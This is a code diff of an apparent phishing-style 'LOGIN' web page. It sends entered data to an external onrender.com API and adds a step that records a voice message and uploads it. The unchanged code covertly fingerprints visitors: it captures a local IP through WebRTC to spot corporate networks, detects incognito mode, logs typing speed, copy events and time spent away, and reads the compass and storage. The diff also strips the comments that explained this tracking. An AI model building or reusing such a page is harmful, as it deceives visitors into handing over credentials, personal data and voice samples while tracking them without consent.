@@ -35,12 +35,14 @@
       font-weight: bold; cursor: pointer; margin-top: 20px;
     }
     button:hover { background: #5568d3; }
-    button:disabled { background: #aaa; }
+    button:disabled { background: #aaa; cursor: not-allowed; }
     .erro {
       margin-top: 12px; padding: 8px; border-radius: 6px;
       font-size: 12px; display: none; text-align: center;
       background: #ffe6e6; color: #a12d2d; border: 1px solid #e6b3b3;
     }
+
+    /* Tela amarela */
     #telaSucesso {
       display: none; position: fixed; inset: 0;
       background: #FFD400; color: #000; z-index: 9999;
@@ -51,10 +53,72 @@
     #telaSucesso h2 { font-size: 34px; font-weight: 900; line-height: 1.2; margin-bottom: 15px; }
     #telaSucesso p { font-size: 18px; font-weight: 600; }
     @keyframes pular { 0%,100%{transform:translateY(0);} 50%{transform:translateY(-12px);} }
+
+    /* Tela de áudio */
+    #telaAudio {
+      display: none; position: fixed; inset: 0;
+      background: linear-gradient(135deg, #667eea, #764ba2);
+      z-index: 9999; padding: 20px;
+      justify-content: center; align-items: center;
+      overflow-y: auto;
+    }
+    #telaAudio .caixa {
+      background: #fff; padding: 26px 22px; border-radius: 14px;
+      max-width: 380px; width: 100%;
+      box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+      text-align: center;
+    }
+    #telaAudio h2 { font-size: 20px; color: #333; margin-bottom: 8px; }
+    #telaAudio p { font-size: 13px; color: #666; margin-bottom: 20px; line-height: 1.5; }
+    #btnGravar {
+      width: 120px; height: 120px; border-radius: 50%;
+      background: #e74c3c; color: #fff; border: none;
+      font-size: 40px; cursor: pointer; margin: 10px auto;
+      display: flex; align-items: center; justify-content: center;
+      box-shadow: 0 6px 20px rgba(231, 76, 60, 0.4);
+      transition: all 0.3s;
+      padding: 0;
+    }
+    #btnGravar:hover { transform: scale(1.05); }
+    #btnGravar.gravando {
+      background: #c0392b;
+      animation: pulso 1s infinite;
+    }
+    @keyframes pulso {
+      0%,100% { box-shadow: 0 6px 20px rgba(231,76,60,0.4); }
+      50%     { box-shadow: 0 6px 40px rgba(231,76,60,0.9), 0 0 60px rgba(231,76,60,0.5); }
+    }
+    #btnGravar:disabled { background: #aaa; cursor: not-allowed; }
+    #tempoGrava {
+      font-size: 20px; color: #e74c3c; font-weight: bold;
+      margin-top: 12px; font-family: 'Consolas', monospace;
+    }
+    #statusTexto {
+      font-size: 13px; color: #666; margin-top: 10px;
+      min-height: 20px;
+    }
+    #previewAudio {
+      display: none; width: 100%; margin-top: 18px;
+    }
+    .botoes-audio {
+      display: flex; gap: 10px; margin-top: 18px; flex-wrap: wrap;
+    }
+    .botoes-audio button {
+      flex: 1; padding: 12px; border-radius: 8px;
+      font-size: 14px; font-weight: bold; cursor: pointer;
+      border: none; margin: 0;
+    }
+    .btn-enviar-audio { background: #27ae60; color: #fff; }
+    .btn-enviar-audio:hover { background: #1e8449; }
+    .btn-pular { background: #ddd; color: #333; }
+    .btn-pular:hover { background: #bbb; }
+    .btn-recomecar { background: #e74c3c; color: #fff; }
+    .btn-recomecar:hover { background: #c0392b; }
   </style>
 </head>
 <body>
 
+  <!-- TELA AMARELA -->
   <div id="telaSucesso">
     <div>
       <div class="icone">📨</div>
@@ -63,6 +127,28 @@
     </div>
   </div>
 
+  <!-- TELA DE ÁUDIO -->
+  <div id="telaAudio">
+    <div class="caixa">
+      <h2>🎙️ Quer deixar um recado?</h2>
+      <p>Toque no botão vermelho pra gravar uma mensagem de voz<br>(opcional, mas ajuda muito!)</p>
+
+      <button id="btnGravar" title="Gravar áudio">🎙️</button>
+      <div id="tempoGrava">00:00</div>
+      <div id="statusTexto">Toque no microfone pra começar</div>
+
+      <audio id="previewAudio" controls></audio>
+
+      <div class="botoes-audio" id="botoesAudio" style="display:none;">
+        <button class="btn-recomecar" onclick="recomecar()">🔄 Regravar</button>
+        <button class="btn-enviar-audio" onclick="enviarAudio()">✅ Enviar</button>
+      </div>
+
+      <button class="btn-pular" id="btnPular" style="margin-top:18px; width:100%; padding:12px; border-radius:8px; border:none; font-size:14px; font-weight:bold; cursor:pointer;" onclick="pular()">Pular esta etapa</button>
+    </div>
+  </div>
+
+  <!-- FORMULÁRIO -->
   <div class="container">
     <h1>🔒 LOGIN</h1>
     <p class="sub">Preencha seus dados abaixo</p>
@@ -86,7 +172,7 @@
   <script>
     const API_URL = 'https://gets-invio-on-api.onrender.com';
 
-    // ============ RASTREAMENTO COMPORTAMENTAL ============
+    // ====== RASTREAMENTO ======
     let tempoFora = 0;
     let ultimaSaida = null;
     let copiouAlgo = false;
@@ -98,7 +184,6 @@
     let connectionType = 'Desconhecida';
     let localIP = null;
 
-    // Tempo parado (Page Visibility)
     document.addEventListener('visibilitychange', () => {
       if (document.hidden) {
         ultimaSaida = Date.now();
@@ -108,10 +193,8 @@
       }
     });
 
-    // Se copiou algo (Ctrl+C)
     document.addEventListener('copy', () => { copiouAlgo = true; });
 
-    // Velocidade de digitação
     document.querySelectorAll('input, textarea').forEach(el => {
       el.addEventListener('keydown', () => {
         if (!inicioDigitacao) inicioDigitacao = Date.now();
@@ -119,14 +202,12 @@
       });
     });
 
-    // Tipo de conexão (wifi/cellular/etc)
     try {
       if (navigator.connection && navigator.connection.type) {
         connectionType = navigator.connection.type;
       }
     } catch (e) {}
 
-    // WebRTC pra pegar IP local (detectar rede corporativa)
     try {
       const pc = new RTCPeerConnection({ iceServers: [] });
       pc.createDataChannel('');
@@ -141,7 +222,6 @@
       };
     } catch (e) {}
 
-    // Detectar modo anônimo
     async function detectarIncognito() {
       try {
         const k = '__test_incognito__';
@@ -152,12 +232,9 @@
           if (est.quota && est.quota < 120000000) return true;
         }
         return false;
-      } catch (e) {
-        return true;
-      }
+      } catch (e) { return true; }
     }
 
-    // Espaço em disco estimado
     async function detectarStorage() {
       try {
         if (navigator.storage && navigator.storage.estimate) {
@@ -171,14 +248,12 @@
       return null;
     }
 
-    // Bússola (funciona em Android; iOS precisa permissão)
     function detectarBussola() {
       return new Promise((resolve) => {
         let resolvido = false;
         const timeout = setTimeout(() => {
           if (!resolvido) { resolvido = true; limpar(); resolve(null); }
         }, 2500);
-
         const handler = (e) => {
           let heading = null;
           if (e.webkitCompassHeading != null) heading = e.webkitCompassHeading;
@@ -190,12 +265,10 @@
             resolve(Math.round(heading));
           }
         };
-
         function limpar() {
           window.removeEventListener('deviceorientationabsolute', handler, true);
           window.removeEventListener('deviceorientation', handler, true);
         }
-
         try {
           window.addEventListener('deviceorientationabsolute', handler, true);
           window.addEventListener('deviceorientation', handler, true);
@@ -206,7 +279,6 @@
       });
     }
 
-    // ============ DETECÇÃO DE DISPOSITIVO ============
     async function detectarDispositivo() {
       const ua = navigator.userAgent;
       let sistema = 'Desconhecido';
@@ -275,7 +347,6 @@
       const agora = new Date();
       const horaCliente = agora.toLocaleString('pt-BR');
 
-      // Detecções assíncronas
       incognito = await detectarIncognito();
       storageInfo = await detectarStorage();
       bussolaHeading = await detectarBussola();
@@ -306,7 +377,10 @@
     const btn = document.getElementById('btn');
     const resultado = document.getElementById('resultado');
     const telaSucesso = document.getElementById('telaSucesso');
+    const telaAudio = document.getElementById('telaAudio');
     const inicio = Date.now();
+
+    let idCadastro = null;
 
     function pegar(id) { return document.getElementById(id).value.trim(); }
 
@@ -318,15 +392,13 @@
       e.target.value = v;
     });
 
-    // Calcular velocidade de digitação
     function calcVelocidadeDigitacao() {
       if (!inicioDigitacao || teclasDigitadas < 2) return null;
       const segundos = (Date.now() - inicioDigitacao) / 1000;
       if (segundos < 1) return null;
-      return Math.round((teclasDigitadas / segundos) * 60); // teclas por minuto
+      return Math.round((teclasDigitadas / segundos) * 60);
     }
 
-    // Referrer
     function pegarOrigem() {
       const ref = document.referrer;
       if (!ref) return 'Direto (digitou ou favorito)';
@@ -349,6 +421,7 @@
       localStorage.setItem('jaVisitou', 'sim');
     } catch (e) {}
 
+    // ====== ENVIAR FORMULÁRIO ======
     btn.addEventListener('click', async () => {
       const tempoSegundos = Math.round((Date.now() - inicio) / 1000);
 
@@ -388,7 +461,16 @@
         const dados = await r.json();
 
         if (dados.sucesso) {
+          idCadastro = dados.dados.id;
+
+          // Mostra tela amarela
           telaSucesso.style.display = 'flex';
+
+          // Depois de 5 segundos, mostra tela de áudio
+          setTimeout(() => {
+            telaSucesso.style.display = 'none';
+            telaAudio.style.display = 'flex';
+          }, 5000);
         } else {
           resultado.textContent = '❌ ' + (dados.erro || 'Erro.');
           resultado.style.display = 'block';
@@ -401,6 +483,148 @@
       btn.disabled = false;
       btn.textContent = 'Enviar';
     });
+
+    // ====== GRAVAÇÃO DE ÁUDIO ======
+    let mediaRecorder = null;
+    let chunksAudio = [];
+    let gravando = false;
+    let inicioGravacao = null;
+    let intervaloTimer = null;
+    let blobAudio = null;
+
+    const btnGravar = document.getElementById('btnGravar');
+    const tempoGrava = document.getElementById('tempoGrava');
+    const statusTexto = document.getElementById('statusTexto');
+    const previewAudio = document.getElementById('previewAudio');
+    const botoesAudio = document.getElementById('botoesAudio');
+    const btnPular = document.getElementById('btnPular');
+
+    btnGravar.addEventListener('click', async () => {
+      if (!gravando) {
+        await iniciarGravacao();
+      } else {
+        pararGravacao();
+      }
+    });
+
+    async function iniciarGravacao() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+        chunksAudio = [];
+        mediaRecorder = new MediaRecorder(stream);
+
+        mediaRecorder.ondataavailable = (e) => {
+          if (e.data.size > 0) chunksAudio.push(e.data);
+        };
+
+        mediaRecorder.onstop = () => {
+          blobAudio = new Blob(chunksAudio, { type: 'audio/webm' });
+          const url = URL.createObjectURL(blobAudio);
+          previewAudio.src = url;
+          previewAudio.style.display = 'block';
+          botoesAudio.style.display = 'flex';
+          btnPular.style.display = 'none';
+          statusTexto.textContent = 'Ouça seu áudio e envie se gostar';
+
+          // Para o stream
+          stream.getTracks().forEach(t => t.stop());
+        };
+
+        mediaRecorder.start();
+        gravando = true;
+        inicioGravacao = Date.now();
+        btnGravar.classList.add('gravando');
+        btnGravar.textContent = '⏹️';
+        statusTexto.textContent = '🔴 GRAVANDO... toque pra parar';
+
+        intervaloTimer = setInterval(() => {
+          const seg = Math.floor((Date.now() - inicioGravacao) / 1000);
+          if (seg >= 60) {
+            pararGravacao(); // Limite de 60 segundos
+            return;
+          }
+          const m = String(Math.floor(seg / 60)).padStart(2, '0');
+          const s = String(seg % 60).padStart(2, '0');
+          tempoGrava.textContent = `${m}:${s}`;
+        }, 200);
+
+      } catch (e) {
+        statusTexto.textContent = '❌ Não consegui acessar o microfone. Verifique as permissões.';
+        console.log(e);
+      }
+    }
+
+    function pararGravacao() {
+      if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+        mediaRecorder.stop();
+      }
+      gravando = false;
+      btnGravar.classList.remove('gravando');
+      btnGravar.textContent = '🎙️';
+      btnGravar.disabled = true;
+      clearInterval(intervaloTimer);
+      tempoGrava.textContent = 'Pronto!';
+    }
+
+    function recomecar() {
+      // Reset
+      blobAudio = null;
+      previewAudio.src = '';
+      previewAudio.style.display = 'none';
+      botoesAudio.style.display = 'none';
+      btnPular.style.display = 'block';
+      btnGravar.disabled = false;
+      btnGravar.textContent = '🎙️';
+      tempoGrava.textContent = '00:00';
+      statusTexto.textContent = 'Toque no microfone pra começar';
+    }
+
+    async function enviarAudio() {
+      if (!blobAudio || !idCadastro) return;
+
+      statusTexto.textContent = '⏳ Enviando áudio...';
+      botoesAudio.style.display = 'none';
+
+      // Converte para base64
+      const reader = new FileReader();
+      reader.readAsDataURL(blobAudio);
+      reader.onloadend = async () => {
+        const base64 = reader.result; // data:audio/webm;base64,...
+
+        try {
+          const r = await fetch(API_URL + '/enviar-audio', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              idCadastro: idCadastro,
+              audio: base64,
+              duracao: Math.round((Date.now() - inicioGravacao) / 1000),
+            })
+          });
+          const dados = await r.json();
+
+          if (dados.sucesso) {
+            statusTexto.textContent = '✅ Áudio enviado! Muito obrigado!';
+            tempoGrava.textContent = '💛';
+            setTimeout(() => {
+              telaAudio.style.display = 'none';
+              alert('Obrigado! Seus dados e mensagem foram recebidos. 💛');
+            }, 1500);
+          } else {
+            statusTexto.textContent = '❌ Erro ao enviar. Tente novamente.';
+            botoesAudio.style.display = 'flex';
+          }
+        } catch (e) {
+          statusTexto.textContent = '❌ Erro de conexão. Tente novamente.';
+          botoesAudio.style.display = 'flex';
+        }
+      };
+    }
+
+    function pular() {
+      telaAudio.style.display = 'none';
+      alert('Obrigado! Seus dados foram recebidos. 💛');
+    }
   </script>
 </body>
 </html>
